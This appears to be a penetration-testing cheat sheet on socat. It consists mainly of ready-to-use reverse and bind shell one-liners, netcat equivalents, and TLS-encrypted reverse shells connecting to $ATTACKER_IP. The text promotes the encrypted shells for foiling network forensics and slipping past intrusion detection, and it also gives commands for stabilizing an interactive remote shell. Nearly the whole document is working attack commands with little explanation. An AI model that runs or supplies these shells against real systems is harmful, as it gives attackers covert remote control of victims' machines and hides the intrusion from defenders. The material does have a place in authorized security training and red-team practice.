# Using "socat"

Socat: An anything-to-anything connector!

## "socat" vs. "netcat"

Equivalent commands between socat and netcat:

```bash
# Reverse shell (attacker)
#
nc -lnp $LISTENER_PORT
socat TCP-LISTEN:$LISTENER_PORT -

# Reverse shell (target)
#
nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash
socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"

# Bind shell (attacker)
#
nc $TARGET_IP $LISTENER_PORT
socat TCP:$TARGET_IP:$LISTENER_PORT

# Bind shell (target)
#
nc -lnp $LISTENER_PORT -e /bin/bash
socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"
```

Socat gets us an interactive login shell right out the gate, though we're still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.

* [Using "netcat"](./Using%20%22netcat%22.md)

### Socat Encrypted Shells

Socat can also make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.

```bash
# Generate a self-signed certificate.
#
openssl req --newkey rsa:2048 -nodes \
            -keyout shell.key -x509 -days 362 \
            -out shell.crt

# Create a PEM file combining the certificate and key.
#
cat shell.key shell.crt > shell.pem

# Start a listener.
#
socat \
	OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -

# Start the reverse shell on the target.
#
socat \
	OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
	EXEC:"/bin/bash -li"
```

The `verify=0` directive turns off certificate validation, so this isn't a "secure" connection in the sense that it's been *authenticated*, but it is secure in the sense that it's *encrypted*.

## Shell "Stabilization"

Shell "stabilization" refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.

We can use socat to create an auto-stabilized reverse shell on UNIX-like systems.

```bash
# Attacker: Connect $LISTENER_PORT to the current TTY,
# send raw keycodes, and turn off terminal echo.
# Basically the `stty raw -echo`.
#
socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0

# Target: Connect the listener on the attacker to an
# interactive login bash shell.
#
#     pty    - allocate a PTTY
#     stderr - redirect STDERR to the attacker
#     sigint - pass signals (Ctrl+C) through
#     setsid - use a new session
#     sane   - use a variety of tweaks to "normalize" the
#              terminal's environment
#
socat TCP:$ATTACKER_IP:$LISTENER_PORT \
      EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
```

Same thing, but over an encrypted connection:

```bash
# Attacker: Connect $LISTENER_PORT to the current TTY,
# send raw keycodes, and turn off terminal echo. Basically
# the `stty raw -echo`.
#
socat \
	OPENSSL-LISTEN:$LISTENER_PORT,cert=$PEM_FILE,verify=0 \
	FILE:`tty`,raw,echo=0

# Target: Connect the listener on the attacker to an
# interactive login bash shell.
#
#     pty    - allocate a PTTY
#     stderr - redirect STDERR to the attacker
#     sigint - pass signals (Ctrl+C) through
#     setsid - use a new session
#     sane   - use a variety of tweaks to "normalize" the
#              terminal's environment
#
socat \
	OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
	EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
```

**Note:** The reverse shell will not pick up on your terminal size, so you'll need to manually specify it using `stty rows` and `stty cols`.
